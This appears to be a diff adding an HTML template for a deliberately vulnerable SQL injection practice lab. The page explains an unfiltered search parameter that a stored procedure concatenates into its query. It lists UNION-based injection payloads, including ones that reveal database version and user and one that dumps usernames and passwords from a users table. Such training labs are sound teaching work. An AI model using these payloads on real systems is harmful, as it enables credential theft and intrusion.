@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="zh-CN" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Union 联合查询注入 - 实验区</title>
+    <link rel="stylesheet" th:href="@{/lab/lab.css}">
+</head>
+<body>
+<div th:replace="~{lab/partials/nav :: nav('union')}"></div>
+
+<main class="page">
+    <section class="hero">
+        <div class="eyebrow">Union Based</div>
+        <h1>用户名搜索中的 UNION 注入</h1>
+        <p>应用层只执行 <code class="mono">CALL lab_search_users(?)</code>；存储过程内部用 <code class="mono">CONCAT</code> 把关键字拼进 LIKE 条件，应用源码看不到这条动态 SQL。先探测列数，再把查询结果回显到表格中。</p>
+    </section>
+
+    <section class="panel">
+        <div class="panel-header">
+            <div>
+                <h2>搜索用户</h2>
+                <p>GET 请求携带 <code class="mono">q</code> 参数，原始输入不会经过过滤。</p>
+            </div>
+            <a class="btn btn-ghost btn-sm" th:href="@{/lab}">返回总览</a>
+        </div>
+        <div class="panel-body">
+            <form class="form-grid" method="get" th:action="@{/lab/union}">
+                <div class="field">
+                    <label for="union-q">搜索关键字</label>
+                    <input id="union-q" type="text" name="q" th:value="${q}" placeholder="例如：admin 或 %' OR 1=1 -- " autofocus>
+                </div>
+                <div class="field">
+                    <button class="btn btn-primary" type="submit">查询</button>
+                </div>
+            </form>
+        </div>
+    </section>
+
+    <section class="panel">
+        <div class="panel-header">
+            <h2>查询结果</h2>
+            <span class="status-pill info" th:text="${rowCount} + ' 行结果'">0 行结果</span>
+        </div>
+        <div class="panel-body">
+            <div th:if="${dbError != null}" class="db-error" th:text="${dbError}">数据库错误</div>
+
+            <div th:unless="${rows.empty}" class="table-wrap">
+                <table class="data-table">
+                    <thead>
+                    <tr>
+                        <th th:each="column : ${columns}" th:text="${column}">列</th>
+                    </tr>
+                    </thead>
+                    <tbody>
+                    <tr th:each="row : ${rows}">
+                        <td th:each="cell : ${row}" th:text="${cell}">值</td>
+                    </tr>
+                    </tbody>
+                </table>
+            </div>
+            <div th:if="${rows.empty and dbError == null}" class="empty-state">未找到匹配的用户。</div>
+        </div>
+    </section>
+
+    <section class="panel">
+        <div class="panel-header">
+            <h2>练习载荷</h2>
+        </div>
+        <div class="panel-body">
+            <ul class="payload-list">
+                <li>%' OR 1=1 -- </li>
+                <li>%' UNION SELECT 1,2,3,4,5 -- </li>
+                <li>%' UNION SELECT 1,database(),user(),version(),4 -- </li>
+                <li>%' UNION SELECT id,username,password,role,email FROM users -- </li>
+            </ul>
+        </div>
+        <div class="panel-footer">关键字包含单引号与注释符时，会直接改变原始查询语义；注意 URL 中空格应编码为 %20 或 +。</div>
+    </section>
+</main>
+</body>
+</html>
